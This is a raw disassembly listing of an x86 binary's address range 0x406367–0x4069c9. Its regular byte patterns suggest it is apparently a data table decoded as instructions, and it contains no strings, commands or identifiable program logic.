  406367:	00 91 00 94 08 89    	add    %dl,-0x76f76c00(%ecx)
  40636d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406370:	b8 2c 00 00 00       	mov    $0x2c,%eax
  406375:	00 96 00 52 19 0a    	add    %dl,0xa195200(%esi)
  40637b:	00 10                	add    %dl,(%eax)
  40637d:	00 40 2d             	add    %al,0x2d(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
  406384:	96                   	xchg   %eax,%esi
  406385:	00 aa 02 94 00 10    	add    %ch,0x10009402(%edx)
  40638b:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	96                   	xchg   %eax,%esi
  406393:	00 cb                	add    %cl,%bl
  406395:	04 58                	add    $0x58,%al
  406397:	00 11                	add    %dl,(%ecx)
  406399:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 96 00 8b 19 9a    	add    %dl,-0x65e67500(%esi)
  4063a5:	00 12                	add    %dl,(%edx)
  4063a7:	00 c8                	add    %cl,%al
  4063a9:	30 00                	xor    %al,(%eax)
  4063ab:	00 00                	add    %al,(%eax)
  4063ad:	00 91 00 02 0d 9a    	add    %dl,-0x65f2fe00(%ecx)
  4063b3:	00 13                	add    %dl,(%ebx)
  4063b5:	00 35 21 00 00 00    	add    %dh,0x21
  4063bb:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  4063c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063c4:	10 31                	adc    %dh,(%ecx)
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	96                   	xchg   %eax,%esi
  4063cb:	00 0f                	add    %cl,(%edi)
  4063cd:	0f 0a                	(bad)
  4063cf:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d2:	78 20                	js     0x4063f4
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	03 15 0e 00 14 00    	add    0x14000e,%edx
  4063e0:	41                   	inc    %ecx
  4063e1:	21 00                	and    %eax,(%eax)
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 96 00 41 17 0a    	add    %dl,0xa174100(%esi)
  4063eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ee:	f8                   	clc
  4063ef:	33 00                	xor    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 91 00 5e 0e 1d    	add    %dl,0x1d0e5e00(%ecx)
  4063f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063fc:	50                   	push   %eax
  4063fd:	34 00                	xor    $0x0,%al
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 91 00 6d 02 1d    	add    %dl,0x1d026d00(%ecx)
  406407:	00 14 00             	add    %dl,(%eax,%eax,1)
  40640a:	a0 34 00 00 00       	mov    0x34,%al
  40640f:	00 91 00 4d 14 1d    	add    %dl,0x1d144d00(%ecx)
  406415:	00 14 00             	add    %dl,(%eax,%eax,1)
  406418:	dc 35 00 00 00 00    	fdivl  0x0
  40641e:	91                   	xchg   %eax,%ecx
  40641f:	00 e9                	add    %ch,%cl
  406421:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  406427:	36 00 00             	add    %al,%ss:(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	91                   	xchg   %eax,%ecx
  40642d:	00 8c 05 1d 00 14 00 	add    %cl,0x14001d(%ebp,%eax,1)
  406434:	78 20                	js     0x406456
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	03 15 0e 00 14 00    	add    0x14000e,%edx
  406442:	6c                   	insb   (%dx),%es:(%edi)
  406443:	36 00 00             	add    %al,%ss:(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	96                   	xchg   %eax,%esi
  406449:	00 ef                	add    %ch,%bh
  40644b:	01 c3                	add    %eax,%ebx
  40644d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406450:	f0 36 00 00          	lock add %al,%ss:(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	96                   	xchg   %eax,%esi
  406457:	00 31                	add    %dh,(%ecx)
  406459:	0d c7 00 14 00       	or     $0x1400c7,%eax
  40645e:	5c                   	pop    %esp
  40645f:	37                   	aaa
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	96                   	xchg   %eax,%esi
  406465:	00 16                	add    %dl,(%esi)
  406467:	12 53 00             	adc    0x0(%ebx),%dl
  40646a:	15 00 7b 21 00       	adc    $0x217b00,%eax
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 96 00 d9 10 1d    	add    %dl,0x1d10d900(%esi)
  406477:	00 15 00 18 39 00    	add    %dl,0x391800
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 96 00 e9 19 0a    	add    %dl,0xa19e900(%esi)
  406485:	00 15 00 90 39 00    	add    %dl,0x399000
  40648b:	00 00                	add    %al,(%eax)
  40648d:	00 96 00 b5 18 c3    	add    %dl,-0x3ce74b00(%esi)
  406493:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 96 00 85 13 d5    	add    %dl,-0x2aec7b00(%esi)
  4064a1:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 96 00 7b 12 0a    	add    %dl,0xa127b00(%esi)
  4064af:	00 16                	add    %dl,(%esi)
  4064b1:	00 f8                	add    %bh,%al
  4064b3:	3a 00                	cmp    (%eax),%al
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 94 06 c3    	add    %dl,-0x3cf96c00(%esi)
  4064bd:	00 16                	add    %dl,(%esi)
  4064bf:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064c3:	00 00                	add    %al,(%eax)
  4064c5:	00 96 00 3a 1c 1d    	add    %dl,0x1d1c3a00(%esi)
  4064cb:	00 16                	add    %dl,(%esi)
  4064cd:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064d3:	00 96 00 2f 1c 0a    	add    %dl,0xa1c2f00(%esi)
  4064d9:	00 16                	add    %dl,(%esi)
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	00 00                	add    %al,(%eax)
  4064df:	00 80 00 96 20 02    	add    %al,0x2209600(%eax)
  4064e5:	1c e0                	sbb    $0xe0,%al
  4064e7:	00 16                	add    %dl,(%esi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	00 00                	add    %al,(%eax)
  4064ed:	00 80 00 96 20 ed    	add    %al,-0x12df6a00(%eax)
  4064f3:	1b e4                	sbb    %esp,%esp
  4064f5:	00 16                	add    %dl,(%esi)
  4064f7:	00 00                	add    %al,(%eax)
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 80 00 96 20 ed    	add    %al,-0x12df6a00(%eax)
  406501:	05 ec 00 19 00       	add    $0x1900ec,%eax
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	80 00 96             	addb   $0x96,(%eax)
  40650d:	20 03                	and    %al,(%ebx)
  40650f:	1b f1                	sbb    %ecx,%esi
  406511:	00 1a                	add    %bl,(%edx)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 80 00 96 20 c1    	add    %al,-0x3edf6a00(%eax)
  40651d:	08 f8                	or     %bh,%al
  40651f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406522:	00 00                	add    %al,(%eax)
  406524:	00 00                	add    %al,(%eax)
  406526:	80 00 96             	addb   $0x96,(%eax)
  406529:	20 80 0e ff 00 1d    	and    %al,0x1d00ff0e(%eax)
  40652f:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  406535:	00 96 00 c9 0b 1c    	add    %dl,0x1c0bc900(%esi)
  40653b:	01 20                	add    %esp,(%eax)
  40653d:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 96 00 6b 19 0a    	add    %dl,0xa196b00(%esi)
  406549:	00 22                	add    %ah,(%edx)
  40654b:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  406552:	96                   	xchg   %eax,%esi
  406553:	00 f1                	add    %dh,%cl
  406555:	19 0a                	sbb    %ecx,(%edx)
  406557:	00 22                	add    %ah,(%edx)
  406559:	00 f4                	add    %dh,%ah
  40655b:	3b 00                	cmp    (%eax),%eax
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 96 00 bf 0a 23    	add    %dl,0x230abf00(%esi)
  406565:	01 22                	add    %esp,(%edx)
  406567:	00 60 3c             	add    %ah,0x3c(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	96                   	xchg   %eax,%esi
  40656f:	00 b6 0a 2a 01 24    	add    %dh,0x24012a0a(%esi)
  406575:	00 cc                	add    %cl,%ah
  406577:	3c 00                	cmp    $0x0,%al
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 96 00 9f 0a 84    	add    %dl,-0x7bf56100(%esi)
  406581:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  406587:	00 00                	add    %al,(%eax)
  406589:	00 96 00 b0 1c 1d    	add    %dl,0x1d1cb000(%esi)
  40658f:	00 26                	add    %ah,(%esi)
  406591:	00 cd                	add    %cl,%ch
  406593:	21 00                	and    %eax,(%eax)
  406595:	00 00                	add    %al,(%eax)
  406597:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  40659d:	00 26                	add    %ah,(%esi)
  40659f:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  4065a5:	00 96 00 13 03 9a    	add    %dl,-0x65fced00(%esi)
  4065ab:	00 26                	add    %ah,(%esi)
  4065ad:	00 dc                	add    %bl,%ah
  4065af:	3f                   	aas
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	91                   	xchg   %eax,%ecx
  4065b5:	00 9c 05 38 01 27 00 	add    %bl,0x270138(%ebp,%eax,1)
  4065bc:	e3 21                	jecxz  0x4065df
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	00 00                	add    %al,(%eax)
  4065c2:	91                   	xchg   %eax,%ecx
  4065c3:	00 69 03             	add    %ch,0x3(%ecx)
  4065c6:	0a 00                	or     (%eax),%al
  4065c8:	28 00                	sub    %al,(%eax)
  4065ca:	13 22                	adc    (%edx),%esp
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	00 00                	add    %al,(%eax)
  4065d0:	96                   	xchg   %eax,%esi
  4065d1:	00 9f 14 3e 01 28    	add    %bl,0x28013e14(%edi)
  4065d7:	00 4a 22             	add    %cl,0x22(%edx)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	91                   	xchg   %eax,%ecx
  4065df:	18 09                	sbb    %cl,(%ecx)
  4065e1:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065e6:	fc                   	cld
  4065e7:	40                   	inc    %eax
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	86 18                	xchg   %bl,(%eax)
  4065ee:	03 15 6b 01 29 00    	add    0x29016b,%edx
  4065f4:	56                   	push   %esi
  4065f5:	22 00                	and    (%eax),%al
  4065f7:	00 00                	add    %al,(%eax)
  4065f9:	00 86 00 7a 1b 70    	add    %al,0x701b7a00(%esi)
  4065ff:	01 2a                	add    %ebp,(%edx)
  406601:	00 74 41 00          	add    %dh,0x0(%ecx,%eax,2)
  406605:	00 00                	add    %al,(%eax)
  406607:	00 86 00 7a 1b 75    	add    %al,0x751b7a00(%esi)
  40660d:	01 2b                	add    %ebp,(%ebx)
  40660f:	00 6e 22             	add    %ch,0x22(%esi)
  406612:	00 00                	add    %al,(%eax)
  406614:	00 00                	add    %al,(%eax)
  406616:	86 00                	xchg   %al,(%eax)
  406618:	72 1b                	jb     0x406635
  40661a:	70 01                	jo     0x40661d
  40661c:	2c 00                	sub    $0x0,%al
  40661e:	cc                   	int3
  40661f:	42                   	inc    %edx
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	86 00                	xchg   %al,(%eax)
  406626:	72 1b                	jb     0x406643
  406628:	75 01                	jne    0x40662b
  40662a:	2d 00 8c 44 00       	sub    $0x448c00,%eax
  40662f:	00 48 00             	add    %cl,0x0(%eax)
  406632:	81 00 e5 0e 7c 01    	addl   $0x17c0ee5,(%eax)
  406638:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  40663f:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  406645:	00 30                	add    %dh,(%eax)
  406647:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  40664e:	96                   	xchg   %eax,%esi
  40664f:	00 1b                	add    %bl,(%ebx)
  406651:	0d c7 00 30 00       	or     $0x3000c7,%eax
  406656:	48                   	dec    %eax
  406657:	45                   	inc    %ebp
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 1b                	add    %bl,(%ebx)
  40665f:	0d 84 01 31 00       	or     $0x310184,%eax
  406664:	9f                   	lahf
  406665:	22 00                	and    (%eax),%al
  406667:	00 00                	add    %al,(%eax)
  406669:	00 96 00 40 16 2a    	add    %dl,0x2a164000(%esi)
  40666f:	01 32                	add    %esi,(%edx)
  406671:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 b1 0c 93 01 33    	add    %dh,0x3301930c(%ecx)
  40667f:	00 88 45 00 00 00    	add    %cl,0x45(%eax)
  406685:	00 96 00 8b 0c 93    	add    %dl,-0x6cf37500(%esi)
  40668b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40668e:	d0 45 00             	rolb   $1,0x0(%ebp)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 96 00 bb 0c 93    	add    %dl,-0x6cf34500(%esi)
  406699:	01 35 00 18 46 00    	add    %esi,0x461800
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 87 16 84    	add    %dl,-0x7be97900(%esi)
  4066a7:	01 36                	add    %esi,(%esi)
  4066a9:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066af:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066b5:	01 37                	add    %esi,(%edi)
  4066b7:	00 c6                	add    %al,%dh
  4066b9:	22 00                	and    (%eax),%al
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066c3:	01 38                	add    %edi,(%eax)
  4066c5:	00 ea                	add    %ch,%dl
  4066c7:	22 00                	and    (%eax),%al
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066d1:	01 39                	add    %edi,(%ecx)
  4066d3:	00 fe                	add    %bh,%dh
  4066d5:	22 00                	and    (%eax),%al
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	00 96 00 c4 05 ab    	add    %dl,-0x54fa3c00(%esi)
  4066df:	01 3a                	add    %edi,(%edx)
  4066e1:	00 78 20             	add    %bh,0x20(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	86 18                	xchg   %bl,(%eax)
  4066ea:	03 15 0e 00 3b 00    	add    0x3b000e,%edx
  4066f0:	0b 23                	or     (%ebx),%esp
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	91                   	xchg   %eax,%ecx
  4066f7:	18 09                	sbb    %cl,(%ecx)
  4066f9:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066fe:	17                   	pop    %ss
  4066ff:	23 00                	and    (%eax),%eax
  406701:	00 00                	add    %al,(%eax)
  406703:	00 86 18 03 15 b1    	add    %al,-0x4eeafce8(%esi)
  406709:	01 3b                	add    %edi,(%ebx)
  40670b:	00 2d 23 00 00 00    	add    %ch,0x23
  406711:	00 e1                	add    %ah,%cl
  406713:	09 cd                	or     %ecx,%ebp
  406715:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  40671b:	23 00                	and    (%eax),%eax
  40671d:	00 00                	add    %al,(%eax)
  40671f:	00 e1                	add    %ah,%cl
  406721:	01 b9 1b bf 01 3c    	add    %edi,0x3c01bf1b(%ecx)
  406727:	00 63 23             	add    %ah,0x23(%ebx)
  40672a:	00 00                	add    %al,(%eax)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	e1 01                	loope  0x406731
  406730:	a8 19                	test   $0x19,%al
  406732:	0e                   	push   %cs
  406733:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406736:	6c                   	insb   (%dx),%es:(%edi)
  406737:	23 00                	and    (%eax),%eax
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 86 18 03 15 cb    	add    %al,-0x34eafce8(%esi)
  406741:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406744:	82 23 00             	andb   $0x0,(%ebx)
  406747:	00 00                	add    %al,(%eax)
  406749:	00 86 00 29 03 d7    	add    %al,-0x28fcd700(%esi)
  40674f:	01 3e                	add    %edi,(%esi)
  406751:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  406757:	00 86 00 29 03 dc    	add    %al,-0x23fcd700(%esi)
  40675d:	01 3e                	add    %edi,(%esi)
  40675f:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  406765:	00 86 00 29 03 e2    	add    %al,-0x1dfcd700(%esi)
  40676b:	01 3f                	add    %edi,(%edi)
  40676d:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  406773:	00 86 00 29 03 e8    	add    %al,-0x17fcd700(%esi)
  406779:	01 40 00             	add    %eax,0x0(%eax)
  40677c:	cb                   	lret
  40677d:	23 00                	and    (%eax),%eax
  40677f:	00 00                	add    %al,(%eax)
  406781:	00 86 08 d3 0f ee    	add    %al,-0x11f02cf8(%esi)
  406787:	01 41 00             	add    %eax,0x0(%ecx)
  40678a:	d9 23                	fldenv (%ebx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	86 08                	xchg   %cl,(%eax)
  406792:	7f 0d                	jg     0x4067a1
  406794:	f4                   	hlt
  406795:	01 42 00             	add    %eax,0x0(%edx)
  406798:	e6 23                	out    %al,$0x23
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	81 00 93 07 6b 01    	addl   $0x16b0793,(%eax)
  4067a4:	42                   	inc    %edx
  4067a5:	00 50 46             	add    %dl,0x46(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	81 00 c8 12 0e 00    	addl   $0xe12c8,(%eax)
  4067b2:	43                   	inc    %ebx
  4067b3:	00 94 46 00 00 00 00 	add    %dl,0x0(%esi,%eax,2)
  4067ba:	81 00 24 03 d7 01    	addl   $0x1d70324,(%eax)
  4067c0:	43                   	inc    %ebx
  4067c1:	00 bc 46 00 00 00 00 	add    %bh,0x0(%esi,%eax,2)
  4067c8:	81 00 6b 0b 0a 02    	addl   $0x20a0b6b,(%eax)
  4067ce:	43                   	inc    %ebx
  4067cf:	00 38                	add    %bh,(%eax)
  4067d1:	47                   	inc    %edi
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	86 00                	xchg   %al,(%eax)
  4067d8:	12 19                	adc    (%ecx),%bl
  4067da:	dc 01                	faddl  (%ecx)
  4067dc:	44                   	inc    %esp
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	24 00                	and    $0x0,%al
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 81 00 a2 04 d7    	add    %al,-0x28fb5e00(%ecx)
  4067e9:	01 45 00             	add    %eax,0x0(%ebp)
  4067ec:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 81 00 b3 04 d7    	add    %al,-0x28fb4d00(%ecx)
  4067f7:	01 45 00             	add    %eax,0x0(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	24 00                	and    $0x0,%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 86 00 b8 04 d7    	add    %al,-0x28fb4800(%esi)
  406805:	01 45 00             	add    %eax,0x0(%ebp)
  406808:	64 47                	fs inc %edi
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	81 00 72 12 0f 02    	addl   $0x20f1272,(%eax)
  406814:	45                   	inc    %ebp
  406815:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	81 00 4c 1c 0f 02    	addl   $0x20f1c4c,(%eax)
  406822:	46                   	inc    %esi
  406823:	00 4a 24             	add    %cl,0x24(%edx)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	86 00                	xchg   %al,(%eax)
  40682c:	dc 13                	fcoml  (%ebx)
  40682e:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  406833:	24 00                	and    $0x0,%al
  406835:	00 00                	add    %al,(%eax)
  406837:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  40683d:	02 48 00             	add    0x0(%eax),%cl
  406840:	e0 48                	loopne 0x40688a
  406842:	00 00                	add    %al,(%eax)
  406844:	00 00                	add    %al,(%eax)
  406846:	86 00                	xchg   %al,(%eax)
  406848:	b6 00                	mov    $0x0,%dh
  40684a:	1f                   	pop    %ds
  40684b:	02 49 00             	add    0x0(%ecx),%cl
  40684e:	88 49 00             	mov    %cl,0x0(%ecx)
  406851:	00 00                	add    %al,(%eax)
  406853:	00 86 00 cf 13 23    	add    %al,0x2313cf00(%esi)
  406859:	02 49 00             	add    0x0(%ecx),%cl
  40685c:	30 4a 00             	xor    %cl,0x0(%edx)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 86 00 fc 18 27    	add    %al,0x2718fc00(%esi)
  406867:	02 49 00             	add    0x0(%ecx),%cl
  40686a:	74 24                	je     0x406890
  40686c:	00 00                	add    %al,(%eax)
  40686e:	00 00                	add    %al,(%eax)
  406870:	86 00                	xchg   %al,(%eax)
  406872:	ac                   	lods   %ds:(%esi),%al
  406873:	16                   	push   %ss
  406874:	2b 02                	sub    (%edx),%eax
  406876:	49                   	dec    %ecx
  406877:	00 c4                	add    %al,%ah
  406879:	4a                   	dec    %edx
  40687a:	00 00                	add    %al,(%eax)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	86 00                	xchg   %al,(%eax)
  406880:	a1 16 31 02 4a       	mov    0x4a023116,%eax
  406885:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  40688b:	00 86 00 29 03 36    	add    %al,0x36032900(%esi)
  406891:	02 4a 00             	add    0x0(%edx),%cl
  406894:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  40689b:	00 29                	add    %ch,(%ecx)
  40689d:	03 3c 02             	add    (%edx,%eax,1),%edi
  4068a0:	4c                   	dec    %esp
  4068a1:	00 74 4b 00          	add    %dh,0x0(%ebx,%ecx,2)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 86 00 91 16 42    	add    %al,0x42169100(%esi)
  4068ad:	02 4e 00             	add    0x0(%esi),%cl
  4068b0:	cc                   	int3
  4068b1:	4b                   	dec    %ebx
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	86 00                	xchg   %al,(%eax)
  4068b8:	68 06 42 02 4f       	push   $0x4f024206
  4068bd:	00 18                	add    %bl,(%eax)
  4068bf:	4c                   	dec    %esp
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	86 00                	xchg   %al,(%eax)
  4068c6:	32 19                	xor    (%ecx),%bl
  4068c8:	dc 01                	faddl  (%ecx)
  4068ca:	50                   	push   %eax
  4068cb:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068d1:	00 86 00 4d 0f 0e    	add    %al,0xe0f4d00(%esi)
  4068d7:	00 51 00             	add    %dl,0x0(%ecx)
  4068da:	c6                   	(bad)
  4068db:	24 00                	and    $0x0,%al
  4068dd:	00 00                	add    %al,(%eax)
  4068df:	00 86 00 a5 0c 6b    	add    %al,0x6b0ca500(%esi)
  4068e5:	01 51 00             	add    %edx,0x0(%ecx)
  4068e8:	d6                   	salc
  4068e9:	24 00                	and    $0x0,%al
  4068eb:	00 00                	add    %al,(%eax)
  4068ed:	00 86 00 99 0c 47    	add    %al,0x470c9900(%esi)
  4068f3:	02 52 00             	add    0x0(%edx),%dl
  4068f6:	f4                   	hlt
  4068f7:	24 00                	and    $0x0,%al
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 86 00 7d 10 4b    	add    %al,0x4b107d00(%esi)
  406901:	02 52 00             	add    0x0(%edx),%dl
  406904:	09 25 00 00 00 00    	or     %esp,0x0
  40690a:	86 00                	xchg   %al,(%eax)
  40690c:	41                   	inc    %ecx
  40690d:	06                   	push   %es
  40690e:	50                   	push   %eax
  40690f:	02 53 00             	add    0x0(%ebx),%dl
  406912:	1f                   	pop    %ds
  406913:	25 00 00 00 00       	and    $0x0,%eax
  406918:	86 00                	xchg   %al,(%eax)
  40691a:	07                   	pop    %es
  40691b:	19 55 02             	sbb    %edx,0x2(%ebp)
  40691e:	54                   	push   %esp
  40691f:	00 d4                	add    %dl,%ah
  406921:	4c                   	dec    %esp
  406922:	00 00                	add    %al,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	86 00                	xchg   %al,(%eax)
  406928:	77 16                	ja     0x406940
  40692a:	2b 02                	sub    (%edx),%eax
  40692c:	55                   	push   %ebp
  40692d:	00 2c 4d 00 00 00 00 	add    %ch,0x0(,%ecx,2)
  406934:	86 00                	xchg   %al,(%eax)
  406936:	59                   	pop    %ecx
  406937:	06                   	push   %es
  406938:	6b 01 56             	imul   $0x56,(%ecx),%eax
  40693b:	00 50 4d             	add    %dl,0x4d(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	00 00                	add    %al,(%eax)
  406942:	86 00                	xchg   %al,(%eax)
  406944:	95                   	xchg   %eax,%ebp
  406945:	0f                   	(bad)
  406946:	0f 02 57 00          	lar    0x0(%edi),%edx
  40694a:	64 53                	fs push %ebx
  40694c:	00 00                	add    %al,(%eax)
  40694e:	00 00                	add    %al,(%eax)
  406950:	86 00                	xchg   %al,(%eax)
  406952:	33 16                	xor    (%esi),%edx
  406954:	31 02                	xor    %eax,(%edx)
  406956:	58                   	pop    %eax
  406957:	00 d0                	add    %dl,%al
  406959:	53                   	push   %ebx
  40695a:	00 00                	add    %al,(%eax)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	86 00                	xchg   %al,(%eax)
  406960:	64 0f                	(bad)
  406962:	0f 02 58 00          	lar    0x0(%eax),%ebx
  406966:	34 25                	xor    $0x25,%al
  406968:	00 00                	add    %al,(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	86 08                	xchg   %cl,(%eax)
  40696e:	71 0c                	jno    0x40697c
  406970:	47                   	inc    %edi
  406971:	02 59 00             	add    0x0(%ecx),%bl
  406974:	3c 25                	cmp    $0x25,%al
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	86 08                	xchg   %cl,(%eax)
  40697c:	7e 0c                	jle    0x40698a
  40697e:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406981:	00 45 25             	add    %al,0x25(%ebp)
  406984:	00 00                	add    %al,(%eax)
  406986:	00 00                	add    %al,(%eax)
  406988:	86 08                	xchg   %cl,(%eax)
  40698a:	b3 13                	mov    $0x13,%bl
  40698c:	23 02                	and    (%edx),%eax
  40698e:	5a                   	pop    %edx
  40698f:	00 4d 25             	add    %cl,0x25(%ebp)
  406992:	00 00                	add    %al,(%eax)
  406994:	00 00                	add    %al,(%eax)
  406996:	86 08                	xchg   %cl,(%eax)
  406998:	c1 13 15             	rcll   $0x15,(%ebx)
  40699b:	02 5a 00             	add    0x0(%edx),%bl
  40699e:	56                   	push   %esi
  40699f:	25 00 00 00 00       	and    $0x0,%eax
  4069a4:	86 08                	xchg   %cl,(%eax)
  4069a6:	e4 18                	in     $0x18,%al
  4069a8:	27                   	daa
  4069a9:	02 5b 00             	add    0x0(%ebx),%bl
  4069ac:	5e                   	pop    %esi
  4069ad:	25 00 00 00 00       	and    $0x0,%eax
  4069b2:	86 08                	xchg   %cl,(%eax)
  4069b4:	f0 18 55 02          	lock sbb %dl,0x2(%ebp)
  4069b8:	5b                   	pop    %ebx
  4069b9:	00 c8                	add    %cl,%al
  4069bb:	54                   	push   %esp
  4069bc:	00 00                	add    %al,(%eax)
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	86 08                	xchg   %cl,(%eax)
  4069c2:	7c 1c                	jl     0x4069e0
  4069c4:	5a                   	pop    %edx
  4069c5:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c9:	25 00 00 00 00       	and    $0x0,%eax
